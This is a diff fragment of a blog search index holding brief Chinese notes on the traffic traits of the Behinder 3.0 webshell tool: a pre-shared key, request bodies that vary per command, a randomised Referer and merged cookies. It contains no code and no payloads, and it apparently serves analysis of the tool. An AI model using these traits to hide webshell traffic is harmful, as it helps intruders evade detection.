+    <content><![CDATA[<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="前面的准备工作"><a href="#前面的准备工作" class="headerlink" title="前面的准备工作"></a>前面的准备工作</h3><p>3.0取消了密钥的明文交换机值，改成了预共享密钥。</p>
+<p>先写着 每次执行命令相同的命令请求体都不一样</p>
+<p>冰蝎会随机初始化refer的值，后面会一直用这个值。</p>
+<p>并且会mergeCookie，这和我之前写的python的脚本一样。对服务器请求过来的Set-cookie会在下次的请求中发送。</p>
 ]]></content>
   </entry>
 </search>
